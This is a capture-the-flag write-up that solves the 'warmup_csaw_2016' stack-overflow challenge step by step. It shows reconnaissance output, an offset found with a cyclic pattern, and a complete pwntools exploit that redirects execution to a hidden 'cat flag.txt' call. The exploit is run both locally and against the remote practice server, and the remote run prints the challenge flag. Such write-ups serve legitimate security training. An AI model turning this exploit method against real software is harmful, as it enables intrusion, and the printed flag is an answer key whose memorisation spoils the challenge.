# 3. warmup_csaw_2016

Normal exec

```python
wayell@wayell:~/Desktop/CTF/BUUCTF/pwn/warmup_csaw_2016$ ./warmup_csaw_2016 
-Warm Up-
WOW:0x40060d
>a
```

Strings

```python
wayell@wayell:~/Desktop/CTF/BUUCTF/pwn/warmup_csaw_2016$ rabin2 -z warmup_csaw_2016 
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000734 0x00400734 12  13   .rodata ascii cat flag.txt
1   0x00000741 0x00400741 10  11   .rodata ascii -Warm Up-\n
2   0x0000074c 0x0040074c 4   5    .rodata ascii WOW:
```

Checksec

```python
pwndbg> checksec
[*] '/home/wayell/Desktop/CTF/BUUCTF/pwn/warmup_csaw_2016/warmup_csaw_2016'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

ltrace

alw print hardcoded 0x40060d

```python
wayell@wayell:~/Desktop/CTF/BUUCTF/pwn/warmup_csaw_2016$ ltrace ./warmup_csaw_2016
__libc_start_main(0x40061d, 1, 0x7ffe21842818, 0x4006b0 <unfinished ...>
write(1, "-Warm Up-\n", 10-Warm Up-
)                                                                         = 10
write(1, "WOW:", 4WOW:)                                                                                 = 4
sprintf("0x40060d\n", "%p\n", 0x40060d)                                                             = 9
write(1, "0x40060d\n", 90x40060d
)                                                                           = 9
write(1, ">", 1>)                                                                                    = 1
gets(0x7ffe218426e0, 0x400755, 1, 0x7f17fdcc8077a
)                                                   = 0x7ffe218426e0
+++ exited (status 224) +++
```

0x40060d

from that instruction onwards, put 

`0   0x00000734 0x00400734 12  13   .rodata ascii cat flag.txt` which we found from earlier strings and call system

```python
pwndbg> x/s 0x400734
0x400734:	"cat flag.txt"

<from objdump>
40060d:	55                   	push   %rbp
  40060e:	48 89 e5             	mov    %rsp,%rbp
  400611:	bf 34 07 40 00       	mov    $0x400734,%edi
  400616:	e8 b5 fe ff ff       	callq  4004d0 <system@plt>
  40061b:	5d                   	pop    %rbp
```

get offset, 72

```python
pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
pwndbg> r
Starting program: /home/wayell/Desktop/CTF/BUUCTF/pwn/warmup_csaw_2016/warmup_csaw_2016 
-Warm Up-
WOW:0x40060d
>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Program received signal SIGSEGV, Segmentation fault.
0x00000000004006a4 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────────────────────────
 RAX  0x7fffffffdeb0 ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
 RBX  0x4006b0 ◂— push   r15
 RCX  0x7ffff7fa7980 (_IO_2_1_stdin_) ◂— 0xfbad2288
 RDX  0x0
 RDI  0x7ffff7fa97f0 (_IO_stdfile_0_lock) ◂— 0x0
 RSI  0x6022a1 ◂— 'aaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa\n'
 R8   0x7fffffffdeb0 ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
 R9   0x0
 R10  0x7ffff7fa7be0 (main_arena+96) —▸ 0x6026a0 ◂— 0x0
 R11  0x246
 R12  0x400520 ◂— xor    ebp, ebp
 R13  0x7fffffffdfe0 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x6161617261616171 ('qaaaraaa')
 RSP  0x7fffffffdef8 ◂— 'saaataaauaaavaaawaaaxaaayaaa'
 RIP  0x4006a4 ◂— ret    
────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────
 ► 0x4006a4    ret    <0x6161617461616173>

─────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdef8 ◂— 'saaataaauaaavaaawaaaxaaayaaa'
01:0008│     0x7fffffffdf00 ◂— 'uaaavaaawaaaxaaayaaa'
02:0010│     0x7fffffffdf08 ◂— 'waaaxaaayaaa'
03:0018│     0x7fffffffdf10 ◂— 0x61616179 /* 'yaaa' */
04:0020│     0x7fffffffdf18 —▸ 0x40061d ◂— push   rbp
05:0028│     0x7fffffffdf20 —▸ 0x4006b0 ◂— push   r15
06:0030│     0x7fffffffdf28 ◂— 0x8daa3c2fdbd978a6
07:0038│     0x7fffffffdf30 —▸ 0x400520 ◂— xor    ebp, ebp
───────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────
 ► f 0         0x4006a4
   f 1 0x6161617461616173
   f 2 0x6161617661616175
   f 3 0x6161617861616177
   f 4       0x61616179
   f 5         0x40061d
   f 6         0x4006b0
   f 7 0x8daa3c2fdbd978a6
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/xw $rsp
0x7fffffffdef8:	0x61616173
pwndbg> cyclic -l 0x61616173
72
```

Local exploit

```python
from pwn import *

# Set up pwntools to work with this binary
elf = context.binary = ELF('warmup_csaw_2016')
#p = remote('node4.buuoj.cn',28814)
p = process()

# Number of padding bytes (to offset RIP)
padding = 72

# Receive payload till WOW: where afterwards is our address to jump to
p.recvuntil("WOW:")

addr = int(p.recvline(keepends = False), 16)

#print(addr)

# Crafting payload, contains x nops of padding, ret, address to jump
payload = flat(
	asm('nop') * padding,
	next(elf.search(asm('ret'))),
	p64(addr),
)

# Writing payload to file on same directory
f = open("payload", "wb")
f.write(payload)

p.recv()

p.sendline(payload)

p.interactive()
```

Local exec

```python
wayell@wayell:~/Desktop/CTF/BUUCTF/pwn/warmup_csaw_2016$ python3 solve.py 
[*] '/home/wayell/Desktop/CTF/BUUCTF/pwn/warmup_csaw_2016/warmup_csaw_2016'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Starting local process '/home/wayell/Desktop/CTF/BUUCTF/pwn/warmup_csaw_2016/warmup_csaw_2016': pid 201954
solve.py:12: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("WOW:")
[*] Switching to interactive mode
flag{local_flag}
```

Remote exploit

```python
from pwn import *

# Set up pwntools to work with this binary
elf = context.binary = ELF('warmup_csaw_2016')
p = remote('node4.buuoj.cn',29643)
#p = process()

# Number of padding bytes (to offset RIP)
padding = 72

# Receive payload till WOW: where afterwards is our address to jump to
p.recvuntil("WOW:")

addr = int(p.recvline(keepends = False), 16)

#print(addr)

# Crafting payload, contains x nops of padding, ret, address to jump
payload = flat(
	asm('nop') * padding,
	next(elf.search(asm('ret'))),
	p64(addr),
)

# Writing payload to file on same directory
f = open("payload", "wb")
f.write(payload)

p.recv()

p.sendline(payload)

p.interactive()
```

Remote exec

```python
wayell@wayell:~/Desktop/CTF/BUUCTF/pwn/warmup_csaw_2016$ python3 solve.py 
[*] '/home/wayell/Desktop/CTF/BUUCTF/pwn/warmup_csaw_2016/warmup_csaw_2016'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Opening connection to node4.buuoj.cn on port 29643: Done
solve.py:12: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("WOW:")
[*] Switching to interactive mode
flag{8d806721-08de-42f3-9b8e-92dd7083ded0}
```